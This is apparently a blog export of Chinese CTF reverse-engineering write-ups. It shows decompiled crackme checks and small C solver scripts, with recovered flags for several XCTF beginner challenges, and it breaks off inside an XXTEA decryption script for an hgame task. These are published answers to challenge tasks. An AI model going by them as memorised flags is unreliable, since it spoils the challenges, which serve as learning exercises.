class="headerlink" title="666"></a>666</h1><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=1&id=5573&page=1">题目链接</a><br>ida64打开</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s; &#x2F;&#x2F; [rsp+0h] [rbp-1E0h]</span><br><span class="line">  char v5; &#x2F;&#x2F; [rsp+F0h] [rbp-F0h]</span><br><span class="line"></span><br><span class="line">  memset(&amp;s, 0, 0x1EuLL);</span><br><span class="line">  printf(&quot;Please Input Key: &quot;, 0LL);</span><br><span class="line">  __isoc99_scanf(&quot;%s&quot;, &amp;v5);</span><br><span class="line">  encode(&amp;v5, &amp;s);</span><br><span class="line">  if ( strlen(&amp;v5) &#x3D;&#x3D; key )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( !strcmp(&amp;s, enflag) )</span><br><span class="line">      puts(&quot;You are Right&quot;);</span><br><span class="line">    else</span><br><span class="line">      puts(&quot;flag&#123;This_1s_f4cker_flag&#125;&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall encode(const char *a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  char v3[32]; &#x2F;&#x2F; [rsp+10h] [rbp-70h]</span><br><span class="line">  char v4[32]; &#x2F;&#x2F; [rsp+30h] [rbp-50h]</span><br><span class="line">  char v5[40]; &#x2F;&#x2F; [rsp+50h] [rbp-30h]</span><br><span class="line">  int v6; &#x2F;&#x2F; [rsp+78h] [rbp-8h]</span><br><span class="line">  int i; &#x2F;&#x2F; [rsp+7Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  i &#x3D; 0;</span><br><span class="line">  v6 &#x3D; 0;</span><br><span class="line">  if ( strlen(a1) !&#x3D; key )</span><br><span class="line">    return puts(&quot;Your Length is Wrong&quot;);</span><br><span class="line">  for ( i &#x3D; 0; i &lt; key; i +&#x3D; 3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v5[i] &#x3D; key ^ (a1[i] + 6);</span><br><span class="line">    v4[i + 1] &#x3D; (a1[i + 1] - 6) ^ key;</span><br><span class="line">    v3[i + 2] &#x3D; a1[i + 2] ^ 6 ^ key;</span><br><span class="line">    *(_BYTE *)(a2 + i) &#x3D; v5[i];</span><br><span class="line">    *(_BYTE *)(a2 + i + 1LL) &#x3D; v4[i + 1];</span><br><span class="line">    *(_BYTE *)(a2 + i + 2LL) &#x3D; v3[i + 2];</span><br><span class="line">  &#125;</span><br><span class="line">  return a2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逻辑很清晰，直接写脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">char f[18]&#x3D;&quot;izwhroz\&quot;\&quot;w\&quot;v.K\&quot;.Ni&quot;;</span><br><span class="line">int i,j,k;</span><br><span class="line">    for ( i &#x3D; 0; i &lt; 18; i+&#x3D;3 )</span><br><span class="line">    &#123;</span><br><span class="line">    f[i]&#x3D;(f[i]^18)-6;</span><br><span class="line">    f[i+1]&#x3D;(f[i+1]^18)+6;</span><br><span class="line">    f[i+2]&#x3D;f[i+2]^18^6;</span><br><span class="line">        printf(&quot;%c%c%c&quot;,f[i],f[i+1],f[i+2]);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>unctf{b66_6b6_66b}</p></blockquote><h1 id="Reversing-x64Elf-100"><a href="#Reversing-x64Elf-100" class="headerlink" title="Reversing-x64Elf-100"></a>Reversing-x64Elf-100</h1><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=1&id=4826&page=1">题目链接</a><br>拖入ida</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  signed __int64 result; &#x2F;&#x2F; rax</span><br><span class="line">  char s; &#x2F;&#x2F; [rsp+0h] [rbp-110h]</span><br><span class="line">  unsigned __int64 v5; &#x2F;&#x2F; [rsp+108h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  printf(&quot;Enter the password: &quot;, a2, a3);</span><br><span class="line">  if ( !fgets(&amp;s, 255, stdin) )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( sub_4006FD(&amp;s) )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Incorrect password!&quot;);</span><br><span class="line">    result &#x3D; 1LL;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Nice!&quot;);</span><br><span class="line">    result &#x3D; 0LL;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 __fastcall sub_4006FD(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  signed int i; &#x2F;&#x2F; [rsp+14h] [rbp-24h]</span><br><span class="line">  const char *v3; &#x2F;&#x2F; [rsp+18h] [rbp-20h]</span><br><span class="line">  const char *v4; &#x2F;&#x2F; [rsp+20h] [rbp-18h]</span><br><span class="line">  const char *v5; &#x2F;&#x2F; [rsp+28h] [rbp-10h]</span><br><span class="line"></span><br><span class="line">  v3 &#x3D; &quot;Dufhbmf&quot;;</span><br><span class="line">  v4 &#x3D; &quot;pG&#96;imos&quot;;</span><br><span class="line">  v5 &#x3D; &quot;ewUglpt&quot;;</span><br><span class="line">  for ( i &#x3D; 0; i &lt;&#x3D; 11; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( (&amp;v3)[i % 3][2 * (i &#x2F; 3)] - *(i + a1) !&#x3D; 1 )</span><br><span class="line">      return 1LL;</span><br><span class="line">  &#125;</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接上脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">char a[3][7]&#x3D;&#123;&#123;&#39;D&#39;,&#39;u&#39;,&#39;f&#39;,&#39;h&#39;,&#39;b&#39;,&#39;m&#39;,&#39;f&#39;&#125;,&#123;&#39;p&#39;,&#39;G&#39;,&#39;&#96;&#39;,&#39;i&#39;,&#39;m&#39;,&#39;o&#39;,&#39;s&#39;&#125;,&#123;&#39;e&#39;,&#39;w&#39;,&#39;U&#39;,&#39;g</span><br><span class="line">  &#39;,&#39;l&#39;,&#39;p&#39;,&#39;t&#39;&#125;&#125;;</span><br><span class="line">int i;</span><br><span class="line">char flag[11];</span><br><span class="line">for ( i &#x3D; 0; i &lt;&#x3D; 11; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        flag[i]&#x3D;a[i % 3][2 * (i &#x2F; 3)]-1;</span><br><span class="line">        printf(&quot;%c&quot;,flag[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Code_Talkers</p></blockquote><h1 id="IgniteMe"><a href="#IgniteMe" class="headerlink" title="IgniteMe"></a>IgniteMe</h1><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=1&id=4590&page=1">题目链接</a><br>ida32打开</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">  v3 &#x3D; sub_402B30(&amp;unk_446360, &quot;Give me your flag:&quot;);</span><br><span class="line">  sub_4013F0(v3, sub_403670);</span><br><span class="line">  sub_401440(v11, 127);</span><br><span class="line">  if ( strlen(v11) &lt; 0x1E &amp;&amp; strlen(v11) &gt; 4 )</span><br><span class="line">  &#123;</span><br><span class="line">    strcpy(v10, &quot;EIS&#123;&quot;);</span><br><span class="line">    for ( i &#x3D; 0; i &lt; strlen(v10); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v11[i] !&#x3D; v10[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 &#x3D; sub_402B30(&amp;unk_446360, &quot;Sorry, keep trying! &quot;);</span><br><span class="line">        sub_4013F0(v6, sub_403670);</span><br><span class="line">        return 0;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v12 &#x3D;&#x3D; &#39;&#125;&#39; )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( sub_4011C0(v11) )</span><br><span class="line">        v8 &#x3D; sub_402B30(&amp;unk_446360, &quot;Congratulations! &quot;);</span><br><span class="line">      else</span><br><span class="line">        v8 &#x3D; sub_402B30(&amp;unk_446360, &quot;Sorry, keep trying! &quot;);</span><br><span class="line">      sub_4013F0(v8, sub_403670);</span><br><span class="line">      result &#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      v7 &#x3D; sub_402B30(&amp;unk_446360, &quot;Sorry, keep trying! &quot;);</span><br><span class="line">      sub_4013F0(v7, sub_403670);</span><br><span class="line">      result &#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    v4 &#x3D; sub_402B30(&amp;unk_446360, &quot;Sorry, keep trying!&quot;);</span><br><span class="line">    sub_4013F0(v4, sub_403670);</span><br><span class="line">    result &#x3D; 0;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">bool __cdecl sub_4011C0(char *a1)</span><br><span class="line">&#123;</span><br><span class="line">  size_t v2; &#x2F;&#x2F; eax</span><br><span class="line">  signed int v3; &#x2F;&#x2F; [esp+50h] [ebp-B0h]</span><br><span class="line">  char v4[32]; &#x2F;&#x2F; [esp+54h] [ebp-ACh]</span><br><span class="line">  int v5; &#x2F;&#x2F; [esp+74h] [ebp-8Ch]</span><br><span class="line">  int v6; &#x2F;&#x2F; [esp+78h] [ebp-88h]</span><br><span class="line">  size_t i; &#x2F;&#x2F; [esp+7Ch] [ebp-84h]</span><br><span class="line">  char v8[128]; &#x2F;&#x2F; [esp+80h] [ebp-80h]</span><br><span class="line"></span><br><span class="line">  if ( strlen(a1) &lt;&#x3D; 4 )</span><br><span class="line">    return 0;</span><br><span class="line">  i &#x3D; 4;</span><br><span class="line">  v6 &#x3D; 0;</span><br><span class="line">  while ( i &lt; strlen(a1) - 1 )</span><br><span class="line">    v8[v6++] &#x3D; a1[i++];</span><br><span class="line">  v8[v6] &#x3D; 0;</span><br><span class="line">  v5 &#x3D; 0;</span><br><span class="line">  v3 &#x3D; 0;</span><br><span class="line">  memset(v4, 0, 0x20u);</span><br><span class="line">  for ( i &#x3D; 0; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 &#x3D; strlen(v8);</span><br><span class="line">    if ( i &gt;&#x3D; v2 )</span><br><span class="line">      break;</span><br><span class="line">    if ( v8[i] &gt;&#x3D; 97 &amp;&amp; v8[i] &lt;&#x3D; 122 )</span><br><span class="line">    &#123;</span><br><span class="line">      v8[i] -&#x3D; 32;</span><br><span class="line">      v3 &#x3D; 1;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( !v3 &amp;&amp; v8[i] &gt;&#x3D; 65 &amp;&amp; v8[i] &lt;&#x3D; 90 )</span><br><span class="line">      v8[i] +&#x3D; 32;</span><br><span class="line">    v4[i] &#x3D; byte_4420B0[i] ^ sub_4013C0(v8[i]);</span><br><span class="line">    v3 &#x3D; 0;</span><br><span class="line">  &#125;</span><br><span class="line">  return strcmp(&quot;GONDPHyGjPEKruv&#123;&#123;pj]X@rF&quot;, v4) &#x3D;&#x3D; 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题就是输入flag，然后大小写相互变化，最后再异或。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int a[32]&#x3D;&#123;0x0D,0x13,0x17,0x11,0x02,0x01,0x20,0x1D,0x0C,0x02,0x19,0x2F,0x17,0x2B,</span><br><span class="line">        0x24,0x1F,0x1E,0x16,0x09,0x0F,0x15,0x27,0x13,0x26,0x0A,0x2F,0x1E,0x1A,0x2D,</span><br><span class="line">0x0C,0x22,0x04&#125;;</span><br><span class="line">char b[24]&#x3D;&quot;GONDPHyGjPEKruv&#123;&#123;pj]X@rF&quot;;</span><br><span class="line">int i,j,v3&#x3D;0;</span><br><span class="line">    for ( i &#x3D; 0; i &lt; 24; i++ )</span><br><span class="line">    &#123;</span><br><span class="line">    b[i]&#x3D;((b[i]^a[i])-72)^0x55;</span><br><span class="line">    if ( b[i] &gt;&#x3D; 97 &amp;&amp; b[i] &lt;&#x3D; 122 )</span><br><span class="line">        &#123;</span><br><span class="line">            b[i] -&#x3D; 32;</span><br><span class="line">            v3 &#x3D; 1;</span><br><span class="line">        &#125;</span><br><span class="line">        if ( !v3 &amp;&amp; b[i] &gt;&#x3D; 65 &amp;&amp; b[i] &lt;&#x3D; 90 )</span><br><span class="line">            b[i] +&#x3D; 32;</span><br><span class="line">    printf(&quot;%c&quot;,b[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>wadx_tdgk_aihc_ihkn_pjlm</p></blockquote><h1 id="easyRE1"><a href="#easyRE1" class="headerlink" title="easyRE1"></a>easyRE1</h1><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=1&id=5592&page=2">题目链接</a><br>ida直接看main函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s1; &#x2F;&#x2F; [rsp+10h] [rbp-110h]</span><br><span class="line">  unsigned __int64 v5; &#x2F;&#x2F; [rsp+118h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;What is the password?&quot;);</span><br><span class="line">  gets(&amp;s1);</span><br><span class="line">  if ( !strcmp(&amp;s1, &quot;the password&quot;) )</span><br><span class="line">    puts(&quot;FLAG:db2f62a36a018bce28e46d976e3f9864&quot;);</span><br><span class="line">  else</span><br><span class="line">    puts(&quot;Wrong!!&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>试着提交一下，对了。</p><blockquote><p>flag{db2f62a36a018bce28e46d976e3f9864}</p></blockquote><h1 id="ReverseMe-120"><a href="#ReverseMe-120" class="headerlink" title="ReverseMe-120"></a>ReverseMe-120</h1><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=1&id=4825&page=2">题目链接</a><br>ida32打开，查看字符串。</p><p><img src="/2021/03/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/ReverseMe-120.png"></p><p>这道题很可能与base家族有关。</p><p><img src="/2021/03/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/1.png"></p><p>main函数里的运算只有41-44行<br>写脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">char a[100]&#x3D;&quot;you_know_how_to_remove_junk_code&quot;;</span><br><span class="line">int i;</span><br><span class="line">    for ( i &#x3D; 0; i &lt; strlen(a); i++ )</span><br><span class="line">    &#123;</span><br><span class="line">    a[i] ^&#x3D; 0x25;</span><br><span class="line">    printf(&quot;%c&quot;,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通常情况下，再base64解码就出来了，但这道题竟然是加密，以后还是要认真看ida里的函数。</p><blockquote><p>XEpQek5LSlJ6TUpSelFKeldASEpTQHpPUEtOekZKQUA=</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hgame</title>
      <link href="2021/03/01/hgame/"/>
      <url>2021/03/01/hgame/</url>
      
        <content type="html"><![CDATA[<h1 id="apacha"><a href="#apacha" class="headerlink" title="apacha"></a>apacha</h1><a id="more"></a><p><a href="https://pan.baidu.com/s/1M0GtstGLe4Gge1fknju5hQ">题目附件</a>提取码：89ri<br>xxtea加密<br><a href="http://www.elecfans.com/emb/danpianji/20110825212016.html">XXTEA加密算法的原理及其C语言实现</a><br>拖入ida</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *v3; &#x2F;&#x2F; rbx</span><br><span class="line">  __int64 v4; &#x2F;&#x2F; rax</span><br><span class="line">  int v6; &#x2F;&#x2F; [rsp+0h] [rbp-48h]</span><br><span class="line">  int v7; &#x2F;&#x2F; [rsp+4h] [rbp-44h]</span><br><span class="line">  int v8; &#x2F;&#x2F; [rsp+8h] [rbp-40h]</span><br><span class="line">  int v9; &#x2F;&#x2F; [rsp+Ch] [rbp-3Ch]</span><br><span class="line">  char v10[40]; &#x2F;&#x2F; [rsp+10h] [rbp-38h]</span><br><span class="line">  unsigned __int64 v11; &#x2F;&#x2F; [rsp+38h] [rbp-10h]</span><br><span class="line"></span><br><span class="line">  v11 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  v6 &#x3D; 1;</span><br><span class="line">  v7 &#x3D; 2;</span><br><span class="line">  v8 &#x3D; 3;</span><br><span class="line">  v9 &#x3D; 4;</span><br><span class="line">  sub_11AA(a1, a2, a3);</span><br><span class="line">  __printf_chk(1LL, &quot;Please input: &quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%35s&quot;, v10);</span><br><span class="line">  if ( (unsigned int)strlen(v10) !&#x3D; 35 )       &#x2F;&#x2F;验证长度</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;wrong length!&quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  v3 &#x3D; malloc(0x8CuLL);</span><br><span class="line">  v4 &#x3D; 0LL;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    v3[v4] &#x3D; v10[v4];</span><br><span class="line">    ++v4;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v4 !&#x3D; 35 );</span><br><span class="line">  sub_1447(v3, 35LL, &amp;v6, v10);                &#x2F;&#x2F;xxtea加密</span><br><span class="line">  if ( (unsigned int)sub_1550(v3, 35LL) )      &#x2F;&#x2F;再次验证</span><br><span class="line">    puts(&quot;    :)  Flag is your input.&quot;);</span><br><span class="line">  else</span><br><span class="line">    puts(&quot;    :(  Try again.&quot;);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#define MX (z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)^(sum^y) + (k[p&amp;3^e]^z);</span><br><span class="line">int btea(int* v, int n, unsigned int k[4])       </span><br><span class="line">&#123;</span><br><span class="line">    unsigned int z&#x3D;v[n-1], y&#x3D;v[0], sum&#x3D;0, e, DELTA&#x3D;0x9e3779b9;</span><br><span class="line">int p, q ;</span><br><span class="line">    if (n &gt; 1) </span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;* 加密过程 *&#x2F;</span><br><span class="line">        q &#x3D; 6 + 52&#x2F;n;</span><br><span class="line">        while (q-- &gt; 0)</span><br><span class="line">        &#123;</span><br><span class="line">    sum +&#x3D; DELTA;</span><br><span class="line">e &#x3D; (sum &gt;&gt; 2) &amp; 3;</span><br><span class="line">            for (p&#x3D;0; p&lt;n-1; p++)</span><br><span class="line">&#123;</span><br><span class="line">y &#x3D; v[p+1];</span><br><span class="line">z &#x3D; v[p] +&#x3D; MX;</span><br><span class="line">&#125;</span><br><span class="line">            y &#x3D; v[0];</span><br><span class="line">z &#x3D; v[n-1] +&#x3D; MX;</span><br><span class="line">&#125;</span><br><span class="line">        return 0 ;</span><br><span class="line">    &#125;</span><br><span class="line">else if (n &lt; -1) </span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;* 解密过程 *&#x2F;</span><br><span class="line">        n &#x3D; -n;</span><br><span class="line">q &#x3D; 6 + 52&#x2F;n;</span><br><span class="line">sum &#x3D; q*DELTA ;</span><br><span class="line">        while (sum !&#x3D; 0)</span><br><span class="line">&#123;</span><br><span class="line">    e &#x3D; (sum &gt;&gt; 2) &amp; 3;</span><br><span class="line">            for (p&#x3D;n-1; p&gt;0; p--) </span><br><span class="line">&#123;</span><br><span class="line">z &#x3D; v[p-1];</span><br><span class="line">y &#x3D; v[p] -&#x3D; MX;</span><br><span class="line">&#125;</span><br><span class="line">            z &#x3D; v[n-1]; </span><br><span class="line">y &#x3D; v[0] -&#x3D; MX;</span><br><span class="line">sum -&#x3D; DELTA; </span><br><span class="line">&#125;</span><br><span class="line">        return 0; </span><br><span class="line">&#125;  </span><br><span class="line">return 1; </span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">unsigned int 